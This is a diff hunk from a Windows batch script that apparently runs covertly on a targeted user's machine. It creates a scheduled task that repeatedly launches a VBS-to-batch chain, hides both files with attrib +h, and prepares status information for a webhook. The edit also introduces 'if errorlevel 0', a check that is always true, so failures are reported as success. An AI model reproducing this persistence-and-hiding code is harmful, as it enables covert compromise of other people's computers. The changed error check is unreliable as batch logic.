@@ -352,13 +352,7 @@ IF "%USERNAME%"=="%targetusername%" (
 
 :: Make a scheduled task so the VBS -> Batch be ran every X 
 >NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr %vpath%\%vname%
-IF NOT ERRORLEVEL 1 (
-	:: DO NOT EDIT, INFO FOR WEBHOOK
-	set "recurring=true, %when%"
-) else (
-	:: DO NOT EDIT, INFO FOR WEBHOOK
-	set "recurring=false, error happened"
-)
+if errorlevel 0 (set "recurring=true, %when%") else (set "recurring=failed, %when%, is probably incorrect.")
 
 :: Hide batch & VBS
 >NUL attrib "%vpath%\%vname%" +h
